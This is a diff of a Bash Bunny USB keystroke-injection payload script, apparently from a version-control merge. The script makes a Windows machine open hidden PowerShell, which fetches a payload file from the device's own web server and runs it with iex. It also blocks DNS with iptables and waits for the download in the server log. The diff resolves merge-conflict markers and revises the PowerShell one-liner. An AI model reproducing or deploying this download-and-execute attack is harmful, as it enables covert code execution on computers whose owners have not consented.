@@ -10,11 +10,7 @@
 #
 # Quick HID attack to retrieve and run powershell payload from BashBunny web server
 # ensure p.txt (your powershell payload) exists in payload directory
-<<<<<<< HEAD
-# 
-=======
 #
->>>>>>> f8a442e66dc60ae47c6a4584ccdfcd5b901a386d
 # | Attack Stage        | Description                              |
 # | ------------------- | ---------------------------------------- |
 # | Stage 1             | Running Initial Powershell Commands      |
@@ -31,17 +27,10 @@ GET SWITCH_POSITION
 # DEFINE DIRECTORIES
 PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
 SERVER_LOG=/tmp/server.log
-<<<<<<< HEAD
 
 # SERVER LOG
 rm -f ${SERVER_LOG}
 
-=======
-
-# SERVER LOG
-rm -f ${SERVER_LOG}
-
->>>>>>> f8a442e66dc60ae47c6a4584ccdfcd5b901a386d
 # START HTTP SERVER
 iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
 /tools/gohttp/gohttp -p 80 -d /tmp/ > ${SERVER_LOG} 2>&1 &
@@ -56,12 +45,12 @@ cp -R ${PAYLOAD_DIR}/* /tmp/ # any additional assets will be available in tmp
 # STAGE 1 - POWERSHELL
 LED STAGE1
 
-RUN WIN "powershell -WindowStyle Hidden \"\$web=New-Object Net.WebClient;while (\$TRUE) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {iex \$web.DownloadString('http://${HOST_IP}/p.txt');\$web.DownloadString('http://172.16.64.1/DONE');exit}}\""
+RUN WIN "powershell -WindowStyle Hidden \"\$web = New-Object Net.WebClient;While (\$true) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {iex \$web.DownloadString('http://${HOST_IP}/p.txt');exit}}\""
 # Remove tracks in the psh payload if you wish
 
 # STAGE 2 - WAIT
 LED STAGE2
-while ! grep -Fq "GET \"/DONE\"" ${SERVER_LOG}; do
+while ! grep -Fq "GET \"/p.txt\"" ${SERVER_LOG}; do
     sleep .5
 done
 
